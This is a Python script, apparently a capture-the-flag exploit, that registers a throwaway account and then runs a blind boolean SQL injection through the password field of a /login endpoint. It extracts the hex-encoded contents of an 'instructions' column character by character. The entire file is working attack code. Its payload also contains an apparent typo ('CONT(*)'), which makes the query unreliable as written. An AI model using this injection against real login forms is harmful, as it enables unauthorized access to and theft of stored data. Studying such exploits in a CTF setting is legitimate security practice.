#!/bin/python
import random
import string
import sys

import requests


def generate_random_string():
    length = random.randint(5, 15)
    letters = string.ascii_letters + string.digits + string.punctuation
    random_string = ''.join(random.choice(letters) for _ in range(length))
    return random_string


baseUrl = "http://" + sys.argv[1] + ":8000"
# we : 10.60.81.1
# nop : 10.60.0.1


username = 'ciaociaomiao'
password = generate_random_string()
headers = {'User-Agent': 'Mozilla/5.1'}
print(requests.post(f"{baseUrl}/register", json={"username": username, "password": password}, headers=headers).status_code)

result = ""
alphabeth = "0123456789abcdef"
while True:
    for i in alphabeth:
        payload = f"SELECT CONT(*) = 1 FROM ((SELECT GROUP_CONCAT(instructions) AS res FROM optionals) AS T) WHERE HEX(res) LIKE \"{result + i}%\""
        print(payload)
        response = requests.post(f"{baseUrl}/login", data={"username": username,
                                                           "password": f"{password}\" and {payload} = 1  --  "}, headers=headers)
        if response.status_code == 200:
            result += i
            print("YES!")
            break
    else:
        print("Nope")
        break
